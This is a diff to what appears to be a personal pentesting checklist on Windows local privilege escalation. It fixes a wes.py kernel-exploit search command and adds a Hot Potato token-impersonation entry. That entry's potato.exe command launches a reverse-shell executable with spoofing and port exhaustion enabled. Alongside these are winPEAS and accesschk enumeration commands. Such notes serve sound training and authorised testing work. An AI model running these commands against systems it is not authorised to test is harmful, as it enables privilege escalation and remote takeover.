@@ -2,8 +2,7 @@
 ***
 ##  Kernel Exploits
 
-* [ ] [[windows-hardening/windows-local-privilege-escalation/README#^01782b|Kernel Exploits]] - `python wes.py systeminfo.txt -i 'Elevation
-of Privilege' --exploits-only | le`
+* [ ] [[windows-hardening/windows-local-privilege-escalation/README#^01782b|Kernel Exploits]] - `python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only | less`
 ***
 ## Services
  -  `.\winPEASany.exe quiet servicesinfo`
@@ -41,3 +40,9 @@ of Privilege' --exploits-only | le`
 * `.\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"`
 ***
 * [ ] [[windows-hardening/windows-local-privilege-escalation/README#^65e359|Exploit Installed Applications]] - `.\winPEASany.exe quiet procesinfo`
+***
+## Token Impersonation
+###  Potatoes
+* [ ] [[Hot Potato|Hot potato]] 
+* `.\potato.exe -ip <local ip> -cmd "C:\PrivEsc\reverse.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true`
+* [ ] 
